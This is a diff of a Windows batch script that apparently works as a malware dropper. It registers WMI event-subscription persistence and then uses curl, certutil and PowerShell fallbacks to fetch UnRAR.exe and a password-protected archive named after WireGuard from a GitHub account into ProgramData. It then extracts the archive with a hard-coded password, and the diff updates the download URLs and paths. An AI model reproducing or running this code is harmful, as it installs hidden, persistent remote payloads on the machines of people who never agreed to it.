@@ -25,17 +25,17 @@ cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespa
 cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='\\.\root\subscription:__EventFilter.Name=\"NOC\"'; Consumer='\\.\root\subscription:CommandLineEventConsumer.Name=\"NOC\"'} | Out-Null"
 
 mkdir %ProgramData%\hared
-dir "%ProgramData%\hared\UnRAR.exe" >nul || %ProgramData%\curl.exe -s -L -o "%ProgramData%\hared\UnRAR.exe" https://github.com/vltex/0/raw/main/1/UnRAR.exe
+dir "%ProgramData%\hared\UnRAR.exe" >nul || %ProgramData%\curl.exe -s -L -o "%ProgramData%\hared\UnRAR.exe" https://github.com/vltex/1/raw/1/0/UnRAR.exe
 dir "%ProgramData%\hared\wireguard.rar" >nul || %ProgramData%\curl.exe -s -L -o "%ProgramData%\hared\wireguard.rar" https://github.com/vltex/0/raw/main/1/wireguard.rar
 
-dir "%ProgramData%\hared\UnRAR.exe" >nul || %WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\hared\UnRAR.exe" https://github.com/vltex/0/raw/main/1/UnRAR.exe
+dir "%ProgramData%\hared\UnRAR.exe" >nul || %WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\hared\UnRAR.exe" https://github.com/vltex/1/raw/1/0/UnRAR.exe
 dir "%ProgramData%\hared\wireguard.rar" >nul || %WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\hared\wireguard.rar" https://github.com/vltex/0/raw/main/1/wireguard.rar
 
-dir "%ProgramData%\hared\UnRAR.exe" >nul || certutil -url""""cache -split -f "https://github.com/vltex/0/raw/main/1/UnRAR.exe" "%ProgramData%\hared\UnRAR.exe"
+dir "%ProgramData%\hared\UnRAR.exe" >nul || certutil -url""""cache -split -f "https://github.com/vltex/1/raw/1/0/UnRAR.exe" "%ProgramData%\hared\UnRAR.exe"
 dir "%ProgramData%\hared\wireguard.rar" >nul || certutil -url""""cache -split -f "https://github.com/vltex/0/raw/main/1/wireguard.rar" "%ProgramData%\hared\wireguard.rar"
 
-dir "%ProgramData%\hared\UnRAR.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/UnRAR.exe -OutFile C:\ProgramData\UnRAR.exe
-dir "%ProgramData%\hared\wireguard.rar" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/wireguard.rar -OutFile C:\ProgramData\wireguard.rar
+dir "%ProgramData%\hared\UnRAR.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/UnRAR.exe -OutFile %ProgramData%\UnRAR.exe
+dir "%ProgramData%\hared\wireguard.rar" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/wireguard.rar -OutFile %ProgramData%\wireguard.rar
 
 "%ProgramData%\hared\UnRAR.exe" x -y -p741258963 "%ProgramData%\hared\wireguard.rar" * "%ProgramData%\hared\"
 
